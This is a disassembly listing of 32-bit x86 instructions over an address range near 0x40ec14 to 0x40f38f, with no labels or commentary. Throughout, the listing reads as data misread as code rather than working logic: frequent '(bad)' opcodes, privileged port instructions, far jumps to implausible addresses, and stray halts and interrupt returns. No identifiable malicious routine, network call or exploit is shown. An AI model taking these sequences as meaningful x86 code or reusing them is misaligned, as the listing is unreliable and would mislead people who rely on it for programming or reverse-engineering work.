  40ec14:	loopne 0x40ec79
  40ec16:	mov    ah,0xfe
  40ec18:	enter  0x893b,0xca
  40ec1c:	dec    edx
  40ec1d:	(bad)  
  40ec1e:	push   cs
  40ec1f:	dec    eax
  40ec21:	push   ebx
  40ec22:	push   0xfffffff4
  40ec24:	cmp    ecx,edi
  40ec26:	pop    esi
  40ec27:	call   0x433659
  40ec2c:	(bad)  
  40ec2d:	shl    DWORD PTR [edi-0x1],1
  40ec30:	and    ch,BYTE PTR [edi+eax*4-0x2f]
  40ec34:	push   0xffffffdf
  40ec36:	and    al,0xfe
  40ec38:	adc    dl,BYTE PTR [ecx+0xd]
  40ec3b:	mov    dh,0xb2
  40ec3d:	pop    edi
  40ec3e:	or     eax,0xb6
  40ec43:	add    BYTE PTR [eax],al
  40ec45:	mov    dl,0x66
  40ec47:	inc    ebx
  40ec48:	fild   QWORD PTR [ebp+0x54]
  40ec4b:	inc    ebx
  40ec4c:	mov    BYTE PTR [eax],bh
  40ec4e:	xor    ebx,DWORD PTR [edi]
  40ec50:	(bad)  
  40ec51:	jmp    0x338:0xf90f026b
  40ec58:	add    BYTE PTR [ebp+0x4],dh
  40ec5b:	ret    0x8203
  40ec5e:	out    0xc,eax
  40ec60:	add    DWORD PTR [ebp+0x6b],esi
  40ec63:	and    DWORD PTR [ecx+ecx*8+0x2],0x523982e9
  40ec6b:	add    eax,0x95d2f80f
  40ec70:	pop    esi
  40ec71:	stos   DWORD PTR es:[edi],eax
  40ec72:	lea    esp,[esi]
  40ec74:	sub    al,0xf6
  40ec76:	(bad)  
  40ec78:	add    esi,esi
  40ec7a:	fmul   st,st(0)
  40ec7c:	add    edi,esp
  40ec7e:	mov    edi,0x954dd84
  40ec83:	aaa    
  40ec84:	or     esi,DWORD PTR [edx-0x70]
  40ec87:	mov    eax,0xf063b404
  40ec8c:	or     bh,BYTE PTR [edi]
  40ec8e:	sbb    eax,0xf3e65ba4
  40ec93:	jmp    0xab9a835d
  40ec98:	imul   edi
  40ec9a:	(bad)  
  40ec9b:	aam    0x8c
  40ec9d:	mov    ecx,0x6acdf166
  40eca2:	(bad)  
  40eca3:	push   cs
  40eca4:	mov    bh,BYTE PTR [ecx+0xc5e1ee]
  40ecaa:	add    BYTE PTR [eax],al
  40ecac:	add    BYTE PTR [eax],al
  40ecae:	pop    edx
  40ecaf:	or     DWORD PTR [ecx+edx*1+0x32],ebp
  40ecb3:	pop    ecx
  40ecb4:	adc    eax,0x5f66b18a
  40ecb9:	enter  0x1d12,0xaf
  40ecbd:	sub    esp,DWORD PTR [ebx+0x22c871c1]
  40ecc3:	sub    eax,0xbefc27af
  40ecc8:	clc    
  40ecc9:	add    edx,0xb1893903
  40eccf:	imul   ax,WORD PTR [esp+esi*2-0x4e],0xf7d5
  40ecd6:	push   esi
  40ecd7:	lock sub BYTE PTR [esp+edi*1],al
  40ecdb:	mov    ebx,0x2161446b
  40ece0:	jb     0x40ecb1
  40ece2:	loop   0x40ecec
  40ece4:	add    BYTE PTR [edi-0x3a],bh
  40ece7:	pop    es
  40ece8:	mov    dh,0x28
  40ecea:	jbe    0x40ed2f
  40ecec:	loope  0x40ecdf
  40ecee:	ins    DWORD PTR es:[edi],dx
  40ecef:	inc    esp
  40ecf0:	mov    dh,BYTE PTR [edi+0x2d]
  40ecf3:	pop    ecx
  40ecf4:	(bad)  
  40ecf5:	jmp    0x9644b157
  40ecfa:	popa   
  40ecfb:	cld    
  40ecfc:	mov    edi,0xf3bdee29
  40ed01:	hlt    
  40ed02:	mov    dl,0x1b
  40ed04:	dec    esi
  40ed05:	shl    DWORD PTR [ecx+0x5248a99],0x58
  40ed0c:	inc    esp
  40ed0d:	std    
  40ed0e:	out    dx,eax
  40ed0f:	mov    ebp,0x72ef
  40ed14:	add    BYTE PTR [eax],al
  40ed16:	add    BYTE PTR [edx],bh
  40ed18:	hlt    
  40ed19:	cmp    ch,BYTE PTR [edi+0x228d0796]
  40ed1f:	ret    
  40ed20:	pop    eax
  40ed21:	(bad)  
  40ed22:	jb     0x40ed56
  40ed24:	ins    BYTE PTR es:[edi],dx
  40ed25:	sub    BYTE PTR [ecx],0x77
  40ed28:	mov    DWORD PTR [ebp+eax*2-0x4],eax
  40ed2c:	mov    esi,0x2438eaef
  40ed31:	mov    DWORD PTR [esi+eiz*4-0x1914407c],ebp
  40ed38:	pop    eax
  40ed39:	je     0x40ed40
  40ed3b:	enter  0x63ee,0xf7
  40ed3f:	ss pop eax
  40ed41:	push   edi
  40ed42:	mov    al,ds:0x640e97f3
  40ed47:	xlat   BYTE PTR ds:[ebx]
  40ed48:	push   ebp
  40ed49:	(bad)  
  40ed4a:	idiv   ch
  40ed4c:	(bad)  
  40ed4d:	out    dx,eax
  40ed4e:	fsubp  st(0),st
  40ed50:	ret    0xf600
  40ed53:	loopne 0x40ed5f
  40ed55:	ror    eax,0x7e
  40ed58:	or     eax,ecx
  40ed5a:	(bad)  
  40ed5b:	clc    
  40ed5c:	jae    0x40ed5d
  40ed5e:	call   0x8218d9
  40ed63:	enter  0xd6ae,0x1b
  40ed67:	sbb    al,0x44
  40ed69:	xchg   DWORD PTR [ebp+0x8],eax
  40ed6c:	xor    DWORD PTR ds:0x895a99ff,edx
  40ed72:	inc    ebp
  40ed73:	mov    eax,0x902045fa
  40ed78:	jno    0x40ed61
  40ed7a:	jo     0x40ed7c
  40ed7c:	add    BYTE PTR [eax],al
  40ed7e:	add    BYTE PTR [eax],al
  40ed80:	add    dh,BYTE PTR [edi-0x45a63803]
  40ed86:	(bad)  
  40ed87:	dec    DWORD PTR [ebx+eax*1-0x14abfc96]
  40ed8e:	ins    BYTE PTR es:[edi],dx
  40ed8f:	inc    BYTE PTR [ebx]
  40ed91:	mov    dh,0xd
  40ed93:	mov    dh,0x5b
  40ed95:	add    ecx,DWORD PTR [edi]
  40ed97:	mov    dh,0xc3
  40ed99:	add    ecx,eax
  40ed9b:	loopne 0x40ee01
  40ed9d:	or     al,cl
  40ed9f:	lea    ebp,[eax+0x3]
  40eda2:	mov    DWORD PTR [ebp-0x44],edx
  40eda5:	mov    WORD PTR [esp+eax*4+0x3b00034c],es
  40edac:	jmp    0x363d:0x9b0c7a4e
  40edb3:	add    DWORD PTR [ebx+eax*1+0x0],ecx
  40edb7:	jmp    0x40f25f
  40edbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edbd:	inc    ebp
  40edbe:	or     al,cl
  40edc0:	jle    0x40edc3
  40edc2:	mov    DWORD PTR [ebp+0x28],edx
  40edc5:	mov    dl,BYTE PTR [eax+edx*1+0x47]
  40edc9:	adc    ecx,DWORD PTR [edx+0x438aad14]
  40edcf:	adc    al,0x95
  40edd1:	dec    edi
  40edd2:	push   es
  40edd3:	mov    ebp,edx
  40edd5:	push   es
  40edd6:	mov    ecx,ebx
  40edd8:	addr16 dec esp
  40edda:	mov    WORD PTR [eax+0x758b024e],sp
  40ede1:	es push esp
  40ede3:	cmp    BYTE PTR [eax],al
  40ede5:	add    BYTE PTR [eax],al
  40ede7:	add    BYTE PTR [eax],al
  40ede9:	cmp    BYTE PTR [ecx+0x9],bl
  40edec:	(bad)  
  40eded:	cmc    
  40edee:	imul   eax,DWORD PTR [edx],0x5a8f600
  40edf4:	mov    DWORD PTR [eax],esi
  40edf6:	cmp    DWORD PTR [ebx+0x74],ebp
  40edf9:	je     0x40ee64
  40edfb:	add    cl,BYTE PTR [ebx+0x3d4fb]
  40ee01:	jne    0x40ee3f
  40ee03:	dec    ebx
  40ee04:	cmp    ch,BYTE PTR [edi+ebx*2+0x6980e67e]
  40ee0b:	add    bh,BYTE PTR [ecx]
  40ee0d:	sub    ah,BYTE PTR [ebp+0x9]
  40ee10:	test   DWORD PTR [ebx-0x1fffdcb],esi
  40ee16:	pop    edi
  40ee17:	mov    ecx,DWORD PTR [ebp+0x268e9]
  40ee1d:	out    dx,al
  40ee1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee1f:	repnz rcl BYTE PTR [ebp+0x6a],0xb2
  40ee24:	(bad)  
  40ee25:	loop   0x40ee86
  40ee27:	pop    ecx
  40ee28:	jne    0x40ee9b
  40ee2a:	(bad)  
  40ee2b:	lock pop edi
  40ee2d:	sub    DWORD PTR [ebx+0x2fba8b02],0xffffff8d
  40ee34:	jle    0x40eeb3
  40ee36:	loop   0x40edf8
  40ee38:	pmaxsw mm3,QWORD PTR [esi+0x5031826a]
  40ee3f:	mov    eax,DWORD PTR [ebp+ecx*4-0xe]
  40ee43:	adc    al,0xfb
  40ee45:	sub    ch,ch
  40ee47:	or     dh,BYTE PTR [esi+0x448b6aba]
  40ee4d:	add    BYTE PTR [eax],al
  40ee4f:	add    BYTE PTR [eax],al
  40ee51:	add    BYTE PTR [ebp-0x18],bh
  40ee54:	inc    edx
  40ee55:	add    DWORD PTR [edx+ecx*2],ebx
  40ee58:	pop    ebp
  40ee59:	dec    BYTE PTR [edx]
  40ee5b:	loope  0x40ee1d
  40ee5d:	and    esi,DWORD PTR [ebp-0x73001385]
  40ee63:	add    ch,cl
  40ee65:	pop    edx
  40ee66:	imul   edi,edx,0xac77b26b
  40ee6c:	aad    0xd0
  40ee6e:	jb     0x40edf9
  40ee70:	mov    eax,ds:0xc606615a
  40ee75:	sar    BYTE PTR [edx+0x6a],1
  40ee78:	test   eax,0x6955cb5d
  40ee7d:	pop    ebx
  40ee7e:	jne    0x40ee4e
  40ee80:	cld    
  40ee81:	sbb    BYTE PTR [esi+edx*2-0x5b],bl
  40ee85:	pop    edx
  40ee86:	es pop ds
  40ee88:	fs inc ebx
  40ee8a:	es or  esp,edx
  40ee8d:	stc    
  40ee8e:	sahf   
  40ee8f:	push   ebp
  40ee90:	lea    ecx,[edx]
  40ee92:	lock xchg edx,eax
  40ee94:	int3   
  40ee95:	add    esi,DWORD PTR [ebp+0x5]
  40ee98:	aaa    
  40ee99:	ret    0x575
  40ee9c:	aas    
  40ee9d:	retf   0x4374
  40eea0:	mov    BYTE PTR [ebx],cl
  40eea2:	outs   dx,BYTE PTR ds:[esi]
  40eea3:	inc    ebx
  40eea4:	jmp    0xb556e104
  40eea9:	iret   
  40eeaa:	and    eax,0xb88eee69
  40eeaf:	rcr    BYTE PTR [edi-0x40],cl
  40eeb2:	jb     0x40ee36
  40eeb4:	add    eax,0xb1
  40eeb9:	add    BYTE PTR [eax],al
  40eebb:	cmp    DWORD PTR [esi+0x33],0xfffffff7
  40eebf:	dec    edx
  40eec0:	push   ebp
  40eec1:	shl    BYTE PTR ds:[edx+0x3],0xde
  40eec6:	cmp    BYTE PTR [ecx-0x7dfc1709],0x8c
  40eecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eece:	add    al,0x7a
  40eed0:	mov    WORD PTR [ebp-0x1f9dcbfb],fs
  40eed6:	push   cs
  40eed7:	xor    al,0x1
  40eed9:	add    DWORD PTR [ebx+0x6774ae53],eax
  40eedf:	(bad)  
  40eee0:	jnp    0x40eee1
  40eee2:	push   0x6a000276
  40eee7:	mov    bh,0x0
  40eee9:	mov    DWORD PTR [ecx+ebp*8],ebp
  40eeec:	imul   edx,DWORD PTR [edx-0x75abb31d],0x4fc2952c
  40eef6:	inc    ebx
  40eef7:	jno    0x40eee1
  40eef9:	inc    ebp
  40eefb:	ret    0x8cec
  40eefe:	push   ss
  40eeff:	jo     0x40eead
  40ef01:	(bad)  
  40ef02:	cmp    al,0xc9
  40ef04:	xchg   edx,ecx
  40ef06:	scas   al,BYTE PTR es:[edi]
  40ef07:	stos   BYTE PTR es:[edi],al
  40ef08:	or     bh,bh
  40ef0a:	sbb    al,0x81
  40ef0c:	push   0x33
  40ef0e:	mov    ds:0x9182544c,eax
  40ef13:	jbe    0x40ef1a
  40ef15:	test   BYTE PTR [ebp+ebx*4+0x54],ch
  40ef19:	inc    ah
  40ef1b:	(bad)  
  40ef1c:	pop    eax
  40ef1d:	(bad)  
  40ef1e:	jle    0x40ef20
  40ef20:	add    BYTE PTR [eax],al
  40ef22:	add    BYTE PTR [eax],al
  40ef24:	jl     0x40efa4
  40ef26:	xchg   ecx,eax
  40ef27:	aad    0x76
  40ef29:	add    bh,BYTE PTR ds:0xfe5422cd
  40ef2f:	fisttp QWORD PTR [ecx-0x33a2e4eb]
  40ef35:	push   esp
  40ef36:	jae    0x40ef3d
  40ef38:	mov    bh,al
  40ef3a:	sti    
  40ef3b:	dec    esi
  40ef3c:	mov    esp,0xb96c24cf
  40ef41:	iret   
  40ef42:	or     bh,ah
  40ef44:	dec    esp
  40ef45:	pop    eax
  40ef46:	(bad)  
  40ef47:	ss ins BYTE PTR es:[edi],dx
  40ef49:	jge    0x40ef4e
  40ef4b:	add    eax,0x5f0f0271
  40ef50:	xor    al,0x3
  40ef52:	xorps  xmm7,XMMWORD PTR [edx+eax*1]
  40ef56:	ror    DWORD PTR [ecx],0x71
  40ef59:	pop    es
  40ef5a:	shr    edx,0xbe
  40ef5d:	sar    DWORD PTR [esi],cl
  40ef5f:	add    al,dh
  40ef61:	inc    ebx
  40ef62:	xchg   edx,eax
  40ef63:	jmp    0x40ef85
  40ef65:	or     esi,DWORD PTR [esi-0x49f4f2b9]
  40ef6b:	dec    edi
  40ef6c:	push   cs
  40ef6d:	rcr    esi,0x8
  40ef70:	out    0xc0,eax
  40ef72:	add    eax,edi
  40ef74:	pop    esp
  40ef75:	cli    
  40ef76:	push   ebx
  40ef77:	je     0x40ef31
  40ef79:	mov    cl,0x43
  40ef7b:	and    ch,cl
  40ef7d:	or     al,BYTE PTR [ebp-0x2734]
  40ef83:	adc    BYTE PTR [ebx],0xff
  40ef86:	call   0x40f08a
  40ef8b:	add    BYTE PTR [eax],al
  40ef8d:	add    eax,0x420ffdbb
  40ef92:	inc    edx
  40ef93:	dec    DWORD PTR [esi]
  40ef95:	push   edx
  40ef96:	dec    edx
  40ef97:	add    cl,al
  40ef99:	cld    
  40ef9a:	pop    es
  40ef9b:	or     eax,ecx
  40ef9d:	mov    bh,0x17
  40ef9f:	cmp    bl,BYTE PTR [esi+0x74]
  40efa2:	or     DWORD PTR [edx-0x67e6],eax
  40efa8:	cmp    ch,BYTE PTR [edx+0x36]
  40efab:	jno    0x40ef88
  40efad:	adc    eax,0xe2eb7699
  40efb2:	jle    0x40efef
  40efb4:	xor    cl,al
  40efb6:	ds (bad) 
  40efb8:	call   FWORD PTR [ebx-0x2d]
  40efbb:	cwde   
  40efbc:	add    BYTE PTR [edi+edi*8+0xe],cl
  40efc0:	mov    dh,0x13
  40efc2:	add    BYTE PTR [ebx-0x7c77d7b2],cl
  40efc8:	ins    BYTE PTR es:[edi],dx
  40efc9:	mov    edi,DWORD PTR [edx-0x4ed7403]
  40efcf:	mov    BYTE PTR [ebp-0x24604],al
  40efd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efd6:	inc    ecx
  40efd7:	sub    sp,WORD PTR [eax+ecx*4-0x75]
  40efdc:	js     0x40f053
  40efde:	in     al,dx
  40efdf:	push   edi
  40efe0:	(bad)  
  40efe1:	out    dx,al
  40efe2:	jne    0x40efee
  40efe4:	sub    edi,DWORD PTR ds:0xa737dd2
  40efea:	push   esp
  40efeb:	push   esi
  40efec:	mov    al,dh
  40efee:	int3   
  40efef:	push   edi
  40eff0:	inc    BYTE PTR [eax]
  40eff2:	add    BYTE PTR [eax],al
  40eff4:	add    BYTE PTR [eax],al
  40eff6:	cli    
  40eff7:	fisttp WORD PTR [ebx+0x2a]
  40effa:	mov    ebp,0x77468c4b
  40efff:	stos   BYTE PTR es:[edi],al
  40f000:	arpl   WORD PTR [edi],ax
  40f002:	in     al,dx
  40f003:	sbb    eax,0xf4230e84
  40f008:	add    cl,BYTE PTR [ebx]
  40f00a:	mov    ah,0x4b
  40f00c:	mov    WORD PTR [esi+0x70],cs
  40f00f:	rol    al,cl
  40f011:	(bad)  
  40f012:	jb     0x40efe7
  40f014:	mov    esi,0xb48b403
  40f019:	or     esi,DWORD PTR [ecx+edx*8+0x1dfe93c0]
  40f020:	hlt    
  40f021:	cwde   
  40f022:	dec    esi
  40f023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f024:	xor    al,0xf7
  40f026:	in     al,dx
  40f027:	sbb    eax,0xe4fb8a80
  40f02c:	add    eax,DWORD PTR [eax]
  40f02e:	jne    0x40f002
  40f030:	rol    BYTE PTR [edi-0x841d12],0x7a
  40f037:	push   0xe8dd8c87
  40f03c:	push   esi
  40f03d:	(bad)  
  40f03e:	xor    ah,bh
  40f040:	jmp    0x40f040
  40f042:	bound  edi,QWORD PTR [ecx+0x5b750004]
  40f048:	mov    eax,DWORD PTR [ecx+eax*1-0x37]
  40f04c:	lock das 
  40f04e:	push   eax
  40f04f:	popf   
  40f050:	add    al,BYTE PTR [ebp-0x5a7a96cb]
  40f056:	jno    0x40f0b3
  40f058:	add    cl,BYTE PTR [edi]
  40f05a:	add    BYTE PTR [eax],al
  40f05c:	add    BYTE PTR [eax],al
  40f05e:	add    ch,bh
  40f060:	add    ah,BYTE PTR [esi]
  40f062:	and    dh,BYTE PTR [ebp+0x2]
  40f065:	push   0x3f
  40f067:	js     0x40f0c4
  40f069:	(bad)  
  40f06a:	pop    esp
  40f06b:	sbb    edx,DWORD PTR [edx+0x5f]
  40f06e:	fldenv [esi+0x7b]
  40f071:	mov    ds:0xc4c7ff53,eax
  40f076:	ret    
  40f077:	mov    dl,0xdc
  40f079:	call   0x5c2f71d4
  40f07e:	scas   eax,DWORD PTR es:[edi]
  40f07f:	ja     0x40f0d2
  40f081:	pop    ebx
  40f082:	cld    
  40f083:	(bad)  
  40f084:	cmp    eax,0xf2695736
  40f089:	aad    0xd0
  40f08b:	outs   dx,BYTE PTR ds:[esi]
  40f08c:	push   ecx
  40f08d:	push   ebx
  40f08e:	or     al,0xdd
  40f090:	cmp    al,al
  40f092:	push   esi
  40f093:	retf   
  40f094:	test   eax,eax
  40f096:	add    al,0x49
  40f098:	daa    
  40f099:	ins    BYTE PTR es:[edi],dx
  40f09a:	inc    ebx
  40f09b:	inc    esi
  40f09c:	std    
  40f09d:	jmp    0x40f094
  40f09f:	scas   al,BYTE PTR es:[edi]
  40f0a0:	push   ecx
  40f0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0a2:	push   es
  40f0a3:	lock mov cs,edx
  40f0a6:	add    esi,DWORD PTR [ebp+0x1]
  40f0a9:	pop    edi
  40f0aa:	mov    esi,0xc6570175
  40f0af:	je     0x40f0f4
  40f0b1:	mov    BYTE PTR [ebx],cl
  40f0b3:	jle    0x40f0f8
  40f0b5:	jmp    0x1d51f315
  40f0ba:	rol    bl,1
  40f0bc:	pop    ebp
  40f0bd:	out    0x8a,al
  40f0bf:	mov    eax,0xc06fd2
  40f0c4:	add    BYTE PTR [eax],al
  40f0c6:	add    BYTE PTR [eax],al
  40f0c8:	jb     0x40f146
  40f0ca:	in     eax,0x17
  40f0cc:	rcl    dh,0xe0
  40f0cf:	pop    ss
  40f0d0:	rol    DWORD PTR [ecx],0x64
  40f0d3:	add    BYTE PTR [esi+0x2],ch
  40f0d6:	jmp    0xe809f3e1
  40f0db:	push   es
  40f0dc:	or     eax,ecx
  40f0de:	(bad)  
  40f0df:	jmp    0x4b9:0xe20731b1
  40f0e6:	clc    
  40f0e7:	imul   eax,DWORD PTR [ebx-0x9f28c4a],0x9862550f
  40f0f1:	sar    edi,1
  40f0f3:	call   0x7d9e6e6e
  40f0f8:	stc    
  40f0f9:	lds    ecx,FWORD PTR [edi]
  40f0fb:	out    dx,al
  40f0fc:	sub    BYTE PTR [edx-0x3],0xf6
  40f100:	mov    al,ds:0x78f95d0c
  40f105:	xchg   BYTE PTR [edi-0x73afbf19],cl
  40f10b:	es je  0x40f090
  40f10e:	aaa    
  40f10f:	lock out dx,eax
  40f111:	lds    ebx,FWORD PTR [edi]
  40f113:	push   esp
  40f114:	js     0x40f193
  40f116:	dec    esp
  40f117:	loope  0x40f18a
  40f119:	cwde   
  40f11a:	inc    esi
  40f11b:	in     eax,0xf5
  40f11d:	popa   
  40f11e:	mul    edx
  40f120:	aaa    
  40f121:	jp     0x40f167
  40f123:	sar    ebp,1
  40f125:	lds    esp,FWORD PTR [ebx]
  40f127:	sub    ecx,esi
  40f129:	xorps  xmm6,XMMWORD PTR [edx+0x0]
  40f12d:	add    BYTE PTR [eax],al
  40f12f:	add    BYTE PTR [eax],al
  40f131:	sub    al,0xc1
  40f133:	push   cs
  40f134:	ins    BYTE PTR es:[edi],dx
  40f135:	popf   
  40f136:	idiv   edi
  40f138:	call   0x1360a73a
  40f13d:	jno    0x40f190
  40f13f:	je     0x40f11e
  40f141:	sub    esi,edx
  40f143:	pop    ss
  40f144:	pop    ds
  40f145:	and    dh,dl
  40f147:	movd   mm0,DWORD PTR [edx-0x4]
  40f14b:	(bad)  
  40f14c:	fdivr  QWORD PTR [esi+0x5a]
  40f14f:	adc    esp,DWORD PTR [ecx-0x38]
  40f152:	push   eax
  40f153:	test   BYTE PTR [ecx],ch
  40f155:	jo     0x40f0dc
  40f157:	adc    ecx,DWORD PTR [ebx]
  40f159:	jns    0x40f15d
  40f15b:	mov    eax,DWORD PTR [eax]
  40f15d:	xor    DWORD PTR [eax-0x19],esp
  40f160:	inc    esp
  40f161:	sub    eax,DWORD PTR [eax+eax*1]
  40f164:	(bad)  
  40f166:	(bad)  
  40f167:	dec    DWORD PTR [esi]
  40f169:	stos   BYTE PTR es:[edi],al
  40f16a:	inc    ebp
  40f16b:	add    cl,al
  40f16d:	jl     0x40f16d
  40f16f:	or     al,cl
  40f171:	shrd   DWORD PTR [esi+0x3f],edi,0xd8
  40f176:	aas    
  40f177:	jmp    0x87ff:0xfdac36e9
  40f17e:	(bad)  
  40f17f:	and    al,BYTE PTR [edi-0x34]
  40f182:	xchg   ebx,eax
  40f183:	push   0x1a410300
  40f188:	mov    ecx,DWORD PTR [ebx+0x671873b5]
  40f18e:	mov    edx,0x5649ff54
  40f193:	std    
  40f194:	jne    0x40f196
  40f196:	add    BYTE PTR [eax],al
  40f198:	add    BYTE PTR [eax],al
  40f19a:	shl    BYTE PTR [esi-0x464bf78d],1
  40f1a0:	cmc    
  40f1a1:	push   DWORD PTR [ebx+0x590fbed0]
  40f1a7:	mov    ecx,0x6cc001f
  40f1ac:	mov    dh,0x47
  40f1ae:	popf   
  40f1af:	push   es
  40f1b0:	mov    dh,0x4f
  40f1b2:	sahf   
  40f1b3:	(bad)  
  40f1b4:	fimul  WORD PTR [eax]
  40f1b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1b7:	les    eax,FWORD PTR [ecx]
  40f1b9:	clc    
  40f1ba:	or     al,0xf6
  40f1bc:	push   ebx
  40f1bd:	je     0x40f1cf
  40f1bf:	(bad)  
  40f1c1:	std    
  40f1c2:	repz mov dh,0x45
  40f1c5:	mov    ebx,ebx
  40f1c7:	push   es
  40f1c8:	mov    dh,0x48
  40f1ca:	lea    eax,[esi]
  40f1cc:	mov    dh,0x50
  40f1ce:	pop    esi
  40f1cf:	(bad)  
  40f1d0:	fisttp WORD PTR [eax]
  40f1d2:	addr16 mov ecx,0xebccc101
  40f1d8:	push   ebx
  40f1d9:	je     0x40f250
  40f1db:	lds    eax,FWORD PTR [edi-0x4e6566b4]
  40f1e1:	imul   esi,DWORD PTR [ebp-0x38],0x68f01bcd
  40f1e8:	(bad)  
  40f1e9:	inc    al
  40f1eb:	xor    DWORD PTR [edi-0x31df3436],eax
  40f1f1:	cvtpi2ps xmm5,QWORD PTR [esi+0x6]
  40f1f5:	jmp    FWORD PTR [eax+0x22706a51]
  40f1fb:	clc    
  40f1fc:	push   ebx
  40f1fd:	test   BYTE PTR [eax],al
  40f1ff:	add    BYTE PTR [eax],al
  40f201:	add    BYTE PTR [eax],al
  40f203:	xor    eax,0x54707d30
  40f208:	pop    ecx
  40f209:	add    ch,cl
  40f20b:	(bad)  
  40f20c:	push   edi
  40f20d:	push   edx
  40f20e:	(bad)  
  40f20f:	mov    dl,0x68
  40f211:	mov    WORD PTR [esi+0x74],es
  40f214:	xor    BYTE PTR [esi+ecx*2+0x7639a77],cl
  40f21b:	outs   dx,BYTE PTR ds:[esi]
  40f21c:	call   0x73b7:0xf7f5f806
  40f223:	loope  0x40f266
  40f225:	test   esp,edi
  40f227:	retf   0x247
  40f22a:	mov    dh,0x32
  40f22c:	pop    edx
  40f22d:	add    DWORD PTR [esi-0x1fbca4ce],esi
  40f233:	jge    0x40f299
  40f235:	cmp    cl,BYTE PTR [edx+0x7f4333b2]
  40f23b:	pop    ebp
  40f23c:	cli    
  40f23d:	jl     0x40f283
  40f23f:	sub    ebx,0x5d408af3
  40f245:	jge    0x40f297
  40f247:	jno    0x40f21d
  40f249:	cld    
  40f24a:	mov    BYTE PTR [eax],ch
  40f24c:	leave  
  40f24d:	jl     0x40f29b
  40f24f:	pop    ecx
  40f250:	test   BYTE PTR [edi],al
  40f252:	sbb    eax,0xffffffcb
  40f255:	add    ecx,DWORD PTR [edx+0x4d69027d]
  40f25b:	retf   0x64fd
  40f25e:	cmp    al,0x7f
  40f260:	add    ch,cl
  40f262:	or     DWORD PTR [ebp-0x54],0xffffffdd
  40f266:	xchg   DWORD PTR [eax],eax
  40f268:	add    BYTE PTR [eax],al
  40f26a:	add    BYTE PTR [eax],al
  40f26c:	or     ebp,edx
  40f26e:	call   0xa28ce776
  40f273:	add    dh,cl
  40f275:	xchg   esp,eax
  40f276:	rol    DWORD PTR [ebx],1
  40f278:	jne    0x40f1fc
  40f27a:	das    
  40f27b:	scas   eax,DWORD PTR es:[edi]
  40f27c:	jnp    0x40f204
  40f27e:	push   ebx
  40f27f:	out    dx,eax
  40f280:	and    cl,BYTE PTR [esi+0x68]
  40f283:	dec    ebp
  40f284:	mov    ecx,0x6fa86cfd
  40f289:	add    ch,cl
  40f28b:	or     DWORD PTR ds:0x82fc7cae,0x4b
  40f292:	mov    al,BYTE PTR [edx]
  40f294:	lock imul ebp,eax,0x36fd7503
  40f29b:	mov    esp,0xc39efd77
  40f2a0:	jbe    0x40f2e5
  40f2a2:	(bad)  
  40f2a3:	sti    
  40f2a4:	outs   dx,DWORD PTR ds:[esi]
  40f2a5:	cmp    ah,BYTE PTR [ebx-0x9]
  40f2a8:	jge    0x40f325
  40f2aa:	sbb    ebx,DWORD PTR [eax-0x3]
  40f2ad:	jl     0x40f31b
  40f2af:	add    esi,DWORD PTR [ebp+0x2]
  40f2b2:	add    bh,BYTE PTR [edx+0x4adfce66]
  40f2b8:	cmp    BYTE PTR [edx],cl
  40f2ba:	call   0x924367c2
  40f2bf:	and    esi,ebp
  40f2c1:	(bad)  
  40f2c2:	in     al,dx
  40f2c3:	jle    0x40f271
  40f2c5:	jns    0x40f305
  40f2c7:	hlt    
  40f2c8:	pop    edi
  40f2c9:	mov    bh,0x94
  40f2cb:	jle    0x40f333
  40f2cd:	jb     0x40f33e
  40f2cf:	test   DWORD PTR [eax],0x0
  40f2d5:	cli    
  40f2d6:	jns    0x40f2ee
  40f2d8:	add    dh,ch
  40f2da:	inc    ecx
  40f2db:	inc    ecx
  40f2dd:	cmp    al,0xe5
  40f2df:	mov    BYTE PTR ds:0xb48b01eb,ah
  40f2e5:	retf   0x37e
  40f2e8:	lock imul eax,edi,0x817cd60f
  40f2ef:	mov    edi,0xfc6c9eb
  40f2f4:	jb     0x40f2b2
  40f2f6:	jno    0x40f2f7
  40f2f8:	call   0xbe127a73
  40f2fd:	or     DWORD PTR [ebx],0x114de54a
  40f303:	mov    esp,DWORD PTR [ebx]
  40f305:	mov    ds:0xa26f88fc,eax
  40f30a:	dec    ebp
  40f30b:	(bad)  
  40f30c:	jmp    0x2850b7a4
  40f311:	xchg   esi,eax
  40f312:	add    edx,DWORD PTR [eax+0x6]
  40f315:	pop    ds
  40f316:	stc    
  40f317:	(bad)  
  40f318:	ja     0x40f314
  40f31a:	dec    ebx
  40f31b:	adc    al,0xa5
  40f31d:	in     al,dx
  40f31e:	or     al,0x0
  40f320:	bound  edi,QWORD PTR [edi-0x1e997510]
  40f326:	jns    0x40f36c
  40f328:	stc    
  40f329:	pop    ecx
  40f32a:	(bad)  
  40f32b:	out    0x6a,eax
  40f32d:	cmp    eax,0xd92488f9
  40f332:	pop    ecx
  40f333:	xchg   BYTE PTR [edi+0x248a4c24],bh
  40f339:	add    BYTE PTR [eax],al
  40f33b:	add    BYTE PTR [eax],al
  40f33d:	add    BYTE PTR [ebp+0x301c3ecc],bh
  40f343:	mov    esi,0xf4ea60e7
  40f348:	push   cs
  40f349:	ins    DWORD PTR es:[edi],dx
  40f34a:	xchg   edi,eax
  40f34b:	dec    eax
  40f34c:	(bad)  
  40f34d:	sahf   
  40f34e:	push   0xfae6efaf
  40f353:	in     eax,0xfb
  40f355:	mov    fs,WORD PTR [ecx*8+0x5f6d0037]
  40f35c:	mov    esi,0x81afec83
  40f361:	rcr    BYTE PTR [esi-0x80],0x3d
  40f365:	push   edi
  40f366:	aad    0x43
  40f368:	push   ds
  40f369:	psrlw  mm5,mm5
  40f36c:	adc    al,0x0
  40f36e:	dec    esp
  40f36f:	iret   
  40f370:	inc    ebx
  40f371:	and    al,0x1c
  40f373:	nop
  40f374:	push   0x1a33bb00
  40f379:	(bad)  
  40f37a:	jecxz  0x40f382
  40f37c:	push   ecx
  40f37d:	push   esi
  40f37e:	jnp    0x40f3b3
  40f380:	push   cs
  40f381:	mov    edx,DWORD PTR [edi-0x4f]
  40f384:	jae    0x40f392
  40f386:	pop    ebx
  40f387:	xor    eax,DWORD PTR [esi]
  40f389:	call   0x3ea711
  40f38e:	xchg   ecx,eax
  40f38f:	(bad)  
